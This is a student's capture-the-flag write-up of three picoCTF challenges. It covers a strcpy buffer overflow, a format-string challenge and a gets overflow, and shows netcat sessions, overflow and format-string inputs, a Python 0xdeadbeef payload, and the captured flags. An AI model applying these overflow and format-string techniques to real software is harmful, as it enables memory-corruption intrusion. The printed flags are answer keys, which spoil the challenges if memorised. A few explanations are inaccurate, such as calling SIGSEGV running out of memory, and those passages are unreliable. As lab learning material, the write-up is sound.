# buffer overflow 0
> Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Additional details will be available after launching your challenge instance.


## Solution:

- connecting nc and running the program doesnt give much information
```
aditya@Dell-Inspiron:~$ nc saturn.picoctf.net 55374
Input: 111
The program will exit now
```
- taking a look at the source code reveals that
```
void vuln(char *input){
  char buf2[16];
  strcpy(buf2, input);
}
```
- buf2 size is only 16 bytes
- The program uses strcpy to copy input user to buf2
- So, if we input more than 16 bytes then it will overwrite into other parts of the memory
- This causes the program to crash, triggering the sigsegv_handler and printing the flag.

```
aditya@Dell-Inspiron:~$ nc saturn.picoctf.net 58075
Input: 111111111111111111111111111111111111111111111111111111111111111111111
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```


## Flag:

```
picoCTF{ov3rfl0ws_ar3nt_that_bad_9f2364bc}
```

## Concepts learnt:
- how overwriting a buffer corrupts nearby memory 
- When a program runs out of memory, it leads to a SIGSEGV error

## Notes:

- I forgot what strcpy did and looked it up... and I also found my hint there (risc of overflow) :) 


## Resources:

- (https://www.geeksforgeeks.org/c/strcpy-in-c/)
- (https://phoenixnap.com/kb/sigsegv)


***



# format string 0
> Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 54366

## Solution:

I found two approaches for this problem

1) I dont know what I am doing approach

- Reading lines 51-78 from `format-string-0.c` it is obvious that "Gr%114d_Cheese" will execute serve_bob()
- connecting nc and input "Gr%114d_Cheese" will give next part and three options out of which "Cla%sic_Che%s%steak" happens to print the flag
```
aditya@Dell-Inspiron:~$ nc mimas.picoctf.net 60756
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: Gr%114d_Cheese
Gr                                                                                                           4202954_Cheese
Good job! Patrick is happy! Now can you serve the second customer?
Sponge Bob wants something outrageous that would break the shop (better be served quick before the shop owner kicks you out!)
Please choose from the following burgers: Pe%to_Portobello, $outhwest_Burger, Cla%sic_Che%s%steak
Enter your recommendation: Cla%sic_Che%s%steak
ClaCla%sic_Che%s%steakic_Che(null)
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

2) I know what a buffer overflow is
- the BUFSIZE is defined as 32 bytes and `scanf("%s", choice1);` will let me input more than the buffer size
- again, if I put a very large value in the input then this causes the program to crash, triggering the sigsegv_handler and printing the flag.

```
aditya@Dell-Inspiron:~$ nc mimas.picoctf.net 54366
Welcome to our newly-opened burger place Pico 'n Patty! Can you help the picky customers find their favorite burger?
Here comes the first customer Patrick who wants a giant bite.
Please choose from the following burgers: Breakf@st_Burger, Gr%114d_Cheese, Bac0n_D3luxe
Enter your recommendation: 11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
There is no such burger yet!

picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```




## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_dc0f36c4}
```

## Concepts learnt:
- how overwriting a buffer corrupts nearby memory 
- When a program runs out of memory, it leads to a SIGSEGV error


## Resources:

- (https://www.geeksforgeeks.org/c/strcpy-in-c/)
- (https://phoenixnap.com/kb/sigsegv)


***


# Clutter over-flow

## Solution

- taking a look at the `chall.c` file reveals that it uses `gets` which means I can exploit it with overflow
- the SIZE of clutter is defined as 0x100 = 256
- if the variables `code` and `GOAL` are equal it will print the flag in flag.txt


- Since I want to overflow the bufer I will need to put more than 256 + 8 random characters in the input. (+8 for the padding created by compiler)
- I'll use python for that
```
>>> print((256+8+1)*"a")
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
```

- I get a non zero hex for the code but its still not giving me the flag
```
My room is so cluttered...
What do you see?
aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
code == 0x61
code != 0xdeadbeef :(
```

- this means I will probably need exactly the number of bytes that 0xdeadbeef stores and add 256+8 to that
- I can get it using python
```
>>> import struct
>>> struct.pack("<L", 0xdeadbeef)
b'\xef\xbe\xad\xde'
```

- hence those 254 'a's and the bytes will overflow into the flag
- adding them using python2 since python3 wont allow it
```
aditya@Dell-Inspiron:~$ touch new.py
aditya@Dell-Inspiron:~$ nano new.py
```
```
print((256+8)*"a" + b'\xef\xbe\xad\xde')
```

- now pipe the output to nc
```
 python2 new.py | nc mars.picoctf.net 31890
```
```
My room is so cluttered...
What do you see?
code == 0xdeadbeef: how did that happen??
take a flag for your troubles
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learned:
- learnt how to convert from hex to binary bytes
- python3 cant add binary and str but python2 can



